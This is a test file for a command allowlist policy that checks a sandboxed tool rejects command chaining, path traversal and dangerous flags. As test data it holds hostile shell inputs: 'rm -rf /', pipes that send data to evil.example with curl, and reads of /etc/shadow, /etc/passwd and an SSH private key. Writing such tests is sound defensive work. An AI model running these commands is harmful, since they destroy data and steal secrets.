import { describe, it, expect } from "vitest";
import { findShellOperator, findUnsafeArgument, globMatch, isCommandAllowed } from "../src/command-policy";

// The sample allowlist shipped in docker-compose.yml, used here to prove the
// documented example is actually enforced against dangerous arguments.
const EXAMPLE = "ls,stat,grep,wc,head,tail,pdftotext";

describe("shell operator rejection", () => {
  it("blocks every way of running a second command", () => {
    const attacks = [
      "ls; rm -rf /",
      "ls && curl http://evil.example",
      "ls || curl http://evil.example",
      "ls | curl -T- http://evil.example",
      "ls &",
      "ls `id`",
      "grep $(cat /etc/shadow) notes.md",
      "ls < notes.md",
      "ls > /etc/cron.d/evil",
      "stat notes.md\nrm -rf /",
      "grep a notes.md\rb rm",
      "echo <(id)",
    ];
    for (const attack of attacks) {
      expect(isCommandAllowed(attack, EXAMPLE), attack).not.toBeNull();
      expect(findShellOperator(attack), attack).not.toBeNull();
    }
  });

  it("reports the offending operator in the message", () => {
    const reason = isCommandAllowed("ls; rm -rf /", EXAMPLE) ?? "";
    expect(reason).toContain("command chaining");
  });

  it("leaves plain invocations alone", () => {
    for (const cmd of ["ls", "grep -rn needle notes", "pdftotext -layout notes/a.pdf"]) {
      expect(findShellOperator(cmd), cmd).toBeNull();
      expect(isCommandAllowed(cmd, EXAMPLE), cmd).toBeNull();
    }
  });
});

describe("argument confinement when an allowlist is configured", () => {
  it("blocks arguments that leave the vault directory", () => {
    const attacks = [
      "grep secret /data/config.json",
      "cat ../etc/passwd",
      "head ~/ssh/id_ed25519",
      "stat \\\\naserver\\share\\secrets",
      "tail C:\\windows\\win.ini",
      "grep x notes/../private.md",
    ];
    for (const attack of attacks) {
      expect(isCommandAllowed(attack, EXAMPLE), attack).not.toBeNull();
      expect(findUnsafeArgument(attack), attack).not.toBeNull();
    }
  });

  it("blocks flags that make a helper execute or delete by itself", () => {
    expect(isCommandAllowed("ls -exec rm x", EXAMPLE)).not.toBeNull();
    expect(findUnsafeArgument("ls -delete")).toContain("executes or deletes");
  });

  it("still allows vault-relative work", () => {
    for (const cmd of ["grep -rn needle notes", "ls notes/sub", "pdftotext notes/a.pdf notes/a.txt"])
      expect(isCommandAllowed(cmd, EXAMPLE), cmd).toBeNull();
  });

  it("does not constrain the explicit wildcard setting", () => {
    // `*` means "no confinement requested": the caller may already run
    // `bash -c ...`, so rejecting operators there adds no safety.
    expect(isCommandAllowed("ls; rm -rf /", "*")).toBeNull();
    expect(isCommandAllowed("ls", "")).toBeNull();
  });

  it("blocks programs that are not listed", () => {
    expect(isCommandAllowed("python script.py", EXAMPLE)).toContain("'python' is not in the allowed list");
    expect(isCommandAllowed("git push --force", EXAMPLE)).toContain("not in the allowed list");
  });
});

describe("pattern matching", () => {
  it("matches whole commands before the first token", () => {
    expect(globMatch("pdftotext *.pdf", "pdftotext notes/a.pdf")).toBe(true);
    expect(globMatch("pdftotext *.pdf", "pdftotext notes/a.pdf out.txt")).toBe(false);
    // A whole-command pattern is the way to pin the invocation shape.
    expect(isCommandAllowed("pdftotext notes/a.pdf out.txt", "pdftotext *.pdf")).not.toBeNull();
    expect(isCommandAllowed("pdftotext notes/a.pdf", "pdftotext *.pdf")).toBeNull();
  });

  it("is case insensitive like the shipped behaviour", () => {
    expect(globMatch("grep", "GREP")).toBe(true);
  });
});
